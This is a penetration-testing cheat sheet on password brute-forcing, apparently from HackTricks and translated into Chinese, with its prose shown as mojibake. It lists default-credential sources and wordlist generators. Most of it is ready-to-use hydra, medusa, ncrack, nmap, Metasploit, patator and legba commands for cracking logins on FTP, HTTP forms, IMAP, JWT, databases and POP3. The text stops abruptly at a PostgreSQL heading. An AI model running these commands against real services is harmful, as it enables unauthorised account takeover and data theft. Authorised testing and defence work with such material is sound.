# æš´åŠ›ç ´è§£ - å¤‡å¿˜å•

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨**HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**æ¨ç‰¹**ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## é»˜è®¤å‡­è¯

åœ¨è°·æ­Œä¸­**æœç´¢**æ­£åœ¨ä½¿ç”¨çš„æŠ€æœ¯çš„é»˜è®¤å‡­è¯ï¼Œæˆ–è€…**å°è¯•ä»¥ä¸‹é“¾æ¥**ï¼š

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **åˆ›å»ºæ‚¨è‡ªå·±çš„å­—å…¸**

æ”¶é›†å°½å¯èƒ½å¤šçš„å…³äºç›®æ ‡çš„ä¿¡æ¯ï¼Œå¹¶ç”Ÿæˆè‡ªå®šä¹‰å­—å…¸ã€‚å¯èƒ½æœ‰å¸®åŠ©çš„å·¥å…·ï¼š

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

æ ¹æ®æ‚¨å¯¹å—å®³è€…çš„äº†è§£ï¼ˆå§“åã€æ—¥æœŸç­‰ï¼‰ç”Ÿæˆå¯†ç 
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

ä¸€ä¸ªè¯è¡¨ç”Ÿæˆå·¥å…·ï¼Œå…è®¸æ‚¨æä¾›ä¸€ç»„å•è¯ï¼Œè®©æ‚¨èƒ½å¤Ÿä»ç»™å®šçš„å•è¯ä¸­åˆ¶ä½œå‡ºå¤šç§å˜ä½“ï¼Œåˆ›å»ºä¸€ä¸ªç‹¬ç‰¹ä¸”ç†æƒ³çš„è¯è¡¨ï¼Œç”¨äºé’ˆå¯¹ç‰¹å®šç›®æ ‡ã€‚
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### å­—å…¸åˆ—è¡¨

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## æœåŠ¡

æŒ‰æœåŠ¡åç§°å­—æ¯é¡ºåºæ’åˆ—ã€‚

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM å’Œ Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker æ³¨å†Œè¡¨
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç½‘ç»œä¸Šäº¤æ¢æ–‡ä»¶çš„æ ‡å‡†ç½‘ç»œåè®®ã€‚é»‘å®¢å¯èƒ½ä¼šå°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£æ–¹æ³•æ¥è·å–FTPæœåŠ¡å™¨çš„è®¿é—®æƒé™ã€‚è¿™é€šå¸¸æ¶‰åŠå°è¯•å¤§é‡çš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆï¼Œç›´åˆ°æ‰¾åˆ°æœ‰æ•ˆçš„å‡­è¯ã€‚

#### å·¥å…·å’Œèµ„æº

- **Hydra**: è¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„ç½‘ç»œç™»å½•ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬FTPã€‚å®ƒå¯ä»¥è¿›è¡Œå¹¶è¡Œå­—å…¸æ”»å‡»ï¼Œä½¿ç ´è§£è¿‡ç¨‹æ›´åŠ é«˜æ•ˆã€‚
- **John the Ripper**: è¿™ä¸ªå·¥å…·æœ€åˆæ˜¯ç”¨æ¥ç ´è§£Unixå¯†ç çš„ï¼Œä½†ç°åœ¨æ”¯æŒå¤šç§å“ˆå¸Œç±»å‹å’Œåè®®ï¼ŒåŒ…æ‹¬FTPã€‚
- **Patator**: Patatoræ˜¯ä¸€ä¸ªå¤šç”¨é€”çš„æš´åŠ›ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§æœåŠ¡å’Œåè®®ï¼ŒFTPä¹Ÿåœ¨å…¶ä¸­ã€‚

#### æ–¹æ³•

1. ç¡®å®šç›®æ ‡FTPæœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£å·ã€‚
2. é€‰æ‹©æˆ–åˆ›å»ºä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç çš„å­—å…¸æ–‡ä»¶ã€‚
3. ä½¿ç”¨ä¸Šè¿°å·¥å…·ä¹‹ä¸€ï¼Œé…ç½®å¥½å¿…è¦çš„å‚æ•°ï¼Œå¼€å§‹æš´åŠ›ç ´è§£æ”»å‡»ã€‚
4. åˆ†æç»“æœï¼Œå¦‚æœæˆåŠŸè·å–å‡­è¯ï¼Œç¡®ä¿åˆæ³•å’Œè´Ÿè´£ä»»åœ°ä½¿ç”¨å®ƒä»¬ã€‚

#### æ³¨æ„äº‹é¡¹

- æš´åŠ›ç ´è§£å¯èƒ½ä¼šåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šäº§ç”Ÿå¤§é‡æ—¥å¿—è®°å½•ï¼Œå¯èƒ½ä¼šè§¦å‘å®‰å…¨è­¦æŠ¥ã€‚
- ä¸€äº›FTPæœåŠ¡å™¨å¯èƒ½æœ‰é˜²æš´åŠ›ç ´è§£çš„æœºåˆ¶ï¼Œå¦‚è´¦æˆ·é”å®šæˆ–å»¶è¿Ÿå“åº”ã€‚
- ä½¿ç”¨æš´åŠ›ç ´è§£æŠ€æœ¯å¯èƒ½è¿åæ³•å¾‹ï¼Œåªåº”åœ¨æˆæƒçš„æ¸—é€æµ‹è¯•æˆ–åˆæ³•çš„å®‰å…¨è¯„ä¼°ä¸­ä½¿ç”¨ã€‚
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTPé€šç”¨æš´åŠ›ç ´è§£

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTPåŸºæœ¬è®¤è¯
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post è¡¨å•
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
```markdown
å¯¹äº http**s**ï¼Œæ‚¨éœ€è¦å°† "http-post-form" æ›´æ”¹ä¸º "**https-post-form"**

### **HTTP - CMS --** (W)ordpressã€(J)oomlaã€(D)rupal æˆ– (M)oodle
```
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAPï¼ˆInternet Message Access Protocolï¼‰æ˜¯ä¸€ç§ç”µå­é‚®ä»¶è·å–åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»è¿œç¨‹é‚®ä»¶æœåŠ¡å™¨è¯»å–ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨IMAPè¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»ï¼Œå°è¯•çŒœæµ‹ç”¨æˆ·çš„é‚®ç®±å¯†ç ã€‚

#### Brute-force Attack

åœ¨æš´åŠ›ç ´è§£æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä½¿ç”¨é¢„å…ˆå‡†å¤‡çš„å¯†ç åˆ—è¡¨æˆ–ç”Ÿæˆå¯†ç çš„ç®—æ³•ï¼Œé€šè¿‡ä¸æ–­å°è¯•æ¥çŒœæµ‹æ­£ç¡®çš„å¯†ç ã€‚è¿™ç§æ–¹æ³•å¯èƒ½ä¼šè€—è´¹å¤§é‡æ—¶é—´ï¼Œå¹¶ä¸”å¦‚æœç›®æ ‡ç³»ç»Ÿæœ‰å°è¯•æ¬¡æ•°é™åˆ¶æˆ–å…¶ä»–å®‰å…¨æªæ–½ï¼Œæ”»å‡»å¯èƒ½ä¼šå¤±è´¥ã€‚

#### Tools

ä»¥ä¸‹æ˜¯ä¸€äº›å¯ä»¥ç”¨äºIMAPæš´åŠ›ç ´è§£çš„å·¥å…·ï¼š

- **Hydra**: è¿™æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„ç½‘ç»œæš´åŠ›ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬IMAPã€‚
- **CrackMapExec**: è¿™æ˜¯ä¸€ä¸ªåæ¸—é€å·¥å…·ï¼Œä¹Ÿå¯ä»¥ç”¨äºå¯¹IMAPæœåŠ¡è¿›è¡Œæš´åŠ›ç ´è§£ã€‚
- **nmap**: é€šè¿‡å…¶è„šæœ¬å¼•æ“Nmap Scripting Engine (NSE)ï¼Œnmapå¯ä»¥æ‰§è¡Œé’ˆå¯¹IMAPæœåŠ¡çš„æš´åŠ›ç ´è§£ã€‚

#### Mitigation

ä¸ºäº†é˜²æ­¢IMAPæš´åŠ›ç ´è§£æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- å¯ç”¨è´¦æˆ·é”å®šç­–ç•¥ï¼Œå½“æ£€æµ‹åˆ°å¤šæ¬¡å¤±è´¥å°è¯•æ—¶é”å®šè´¦æˆ·ã€‚
- ä½¿ç”¨å¤æ‚ä¸”éš¾ä»¥çŒœæµ‹çš„å¯†ç ã€‚
- å¯ç”¨åŒå› ç´ è®¤è¯ï¼ˆ2FAï¼‰ã€‚
- ç›‘æ§å¼‚å¸¸ç™»å½•å°è¯•ã€‚

#### Resources

- [OWASP Testing Guide on Brute Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Weak_Password_Policy)
- [IMAP RFC 3501](https://tools.ietf.org/html/rfc3501)
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRCï¼ˆInternet Relay Chatï¼‰æ˜¯ä¸€ç§åœ¨çº¿èŠå¤©åè®®ï¼Œå®ƒå…è®¸ç”¨æˆ·é€šè¿‡ä¸åŒçš„é¢‘é“è¿›è¡Œå®æ—¶é€šä¿¡ã€‚é»‘å®¢å’Œå®‰å…¨ç ”ç©¶äººå‘˜ç»å¸¸ä½¿ç”¨IRCæ¥äº¤æµæŠ€æœ¯ä¿¡æ¯ã€åˆ†äº«å·¥å…·å’Œåä½œã€‚å°½ç®¡å®ƒä¸åƒä»¥å‰é‚£ä¹ˆæµè¡Œï¼Œä½†IRCåœ¨æŸäº›ç¤¾åŒºä¸­ä»ç„¶æ˜¯ä¸€ä¸ªé‡è¦çš„èµ„æºã€‚
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT (JSON Web Token)
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT
```
ncrack mqtt://127.0.0.1 --user test â€“P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQLï¼ˆMicrosoft SQL Serverï¼‰æ˜¯å¾®è½¯å¼€å‘çš„ä¸€ç§å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚å®ƒæ”¯æŒå¤šç§æ•°æ®ç±»å‹ã€å¤æ‚æŸ¥è¯¢ã€æ•°æ®åˆ†æå’Œäº‹åŠ¡å¤„ç†ã€‚MSSQLå¹¿æ³›åº”ç”¨äºä¼ä¸šç¯å¢ƒä¸­ï¼Œç”¨äºå­˜å‚¨å’Œç®¡ç†å¤§é‡æ•°æ®ã€‚

åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£æ–¹æ³•æ¥è·å–å¯¹MSSQLæ•°æ®åº“çš„è®¿é—®æƒé™ã€‚è¿™é€šå¸¸æ¶‰åŠå°è¯•å¤§é‡çš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆï¼Œç›´åˆ°æ‰¾åˆ°æœ‰æ•ˆçš„å‡­æ®ã€‚æˆåŠŸçš„æš´åŠ›ç ´è§£æ”»å‡»å¯ä»¥è®©æ”»å‡»è€…è®¿é—®æ•æ„Ÿæ•°æ®ï¼Œç”šè‡³å¯èƒ½è·å¾—å¯¹æ•´ä¸ªç³»ç»Ÿçš„æ§åˆ¶ã€‚

ä¸ºäº†è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦ä½¿ç”¨ä¸“é—¨çš„å·¥å…·å’ŒæŠ€æœ¯ã€‚è¿™äº›å·¥å…·å¯ä»¥è‡ªåŠ¨åŒ–ç™»å½•å°è¯•è¿‡ç¨‹ï¼Œå¹¶èƒ½å¤Ÿå¿«é€Ÿå°è¯•æˆåƒä¸Šä¸‡çš„ä¸åŒç»„åˆã€‚æ”»å‡»è€…è¿˜å¯èƒ½åˆ©ç”¨ä»å…¶ä»–æ•°æ®æ³„éœ²ä¸­è·å¾—çš„å‡­æ®ï¼Œå› ä¸ºç”¨æˆ·å¾€å¾€ä¼šåœ¨ä¸åŒçš„æœåŠ¡ä¸­é‡å¤ä½¿ç”¨ç›¸åŒçš„å¯†ç ã€‚

é˜²å¾¡æš´åŠ›ç ´è§£æ”»å‡»çš„æ–¹æ³•åŒ…æ‹¬å®æ–½è´¦æˆ·é”å®šç­–ç•¥ã€ä½¿ç”¨å¤æ‚å¯†ç ã€å¯ç”¨å¤šå› ç´ è®¤è¯ä»¥åŠç›‘æ§å¼‚å¸¸ç™»å½•å°è¯•ã€‚è¿™äº›æªæ–½å¯ä»¥æ˜¾è‘—æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå‡å°‘è¢«æˆåŠŸæ”»å‡»çš„é£é™©ã€‚
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
ä¸ºäº†ä½¿ç”¨ **patator** çš„ **oracle\_login** åŠŸèƒ½ï¼Œä½ éœ€è¦**å®‰è£…**ï¼š
```bash
pip3 install cx_Oracle --upgrade
```
[ç¦»çº¿ OracleSQL å“ˆå¸Œæš´åŠ›ç ´è§£](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)ï¼ˆ**ç‰ˆæœ¬ 11.1.0.6ã€11.1.0.7ã€11.2.0.1ã€11.2.0.2** å’Œ **11.2.0.3**ï¼‰ï¼š
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POPï¼ˆé‚®å±€åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºä»é‚®ä»¶æœåŠ¡å™¨æ¥æ”¶ç”µå­é‚®ä»¶çš„åè®®ã€‚é»‘å®¢å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£æ”»å‡»æ¥å°è¯•è·å–å¯¹ç”µå­é‚®ä»¶è´¦æˆ·çš„è®¿é—®æƒé™ã€‚è¿™é€šå¸¸æ¶‰åŠå°è¯•å¤§é‡çš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„å‡­è¯ä¸ºæ­¢ã€‚

#### å·¥å…·å’Œèµ„æº

- **Hydra**: è¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„ç½‘ç»œç™»å½•ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬POP3ã€‚
- **John the Ripper**: è¿™ä¸ªå·¥å…·é€šå¸¸ç”¨äºç ´è§£å¯†ç å“ˆå¸Œï¼Œä½†ä¹Ÿå¯ä»¥ç”¨æ¥å¯¹POP3è´¦æˆ·è¿›è¡Œæš´åŠ›ç ´è§£ã€‚
- **CrackMapExec**: ä¸€ä¸ªå¤šåŠŸèƒ½å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥å¯¹æ”¯æŒPOPçš„é‚®ä»¶æœåŠ¡å™¨è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

#### æ–¹æ³•

1. ç¡®å®šç›®æ ‡é‚®ä»¶æœåŠ¡å™¨çš„IPåœ°å€å’ŒPOP3ç«¯å£ï¼ˆé€šå¸¸æ˜¯110æˆ–995ï¼‰ã€‚
2. ä½¿ç”¨ä¸Šè¿°å·¥å…·ä¹‹ä¸€ï¼Œé…ç½®æ”»å‡»å‚æ•°ï¼ŒåŒ…æ‹¬ç”¨æˆ·ååˆ—è¡¨ã€å¯†ç åˆ—è¡¨å’Œè¿æ¥è®¾ç½®ã€‚
3. å¯åŠ¨æ”»å‡»å¹¶ç›‘æ§è¿›åº¦ï¼Œç›´åˆ°æ‰¾åˆ°æœ‰æ•ˆçš„å‡­è¯ã€‚
4. ä¸€æ—¦è·å–äº†è®¿é—®æƒé™ï¼Œå°±å¯ä»¥è¯»å–ç›®æ ‡çš„ç”µå­é‚®ä»¶ã€‚

#### é˜²å¾¡æªæ–½

- å¯ç”¨è´¦æˆ·é”å®šç­–ç•¥ï¼Œä»¥é˜²æ­¢åœ¨å¤šæ¬¡ç™»å½•å¤±è´¥åç»§ç»­å°è¯•ã€‚
- ä½¿ç”¨å¼ºå¯†ç ï¼Œå¹¶å®šæœŸæ›´æ¢å¯†ç ã€‚
- å¯ç”¨å¤šå› ç´ è®¤è¯ï¼Œä¸ºè´¦æˆ·å®‰å…¨å¢åŠ ä¸€å±‚é¢å¤–ä¿æŠ¤ã€‚
- ç›‘æ§ä¸å¯»å¸¸çš„ç™»å½•å°è¯•ï¼Œå¹¶åŠæ—¶å“åº”å¯ç–‘æ´»åŠ¨ã€‚
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

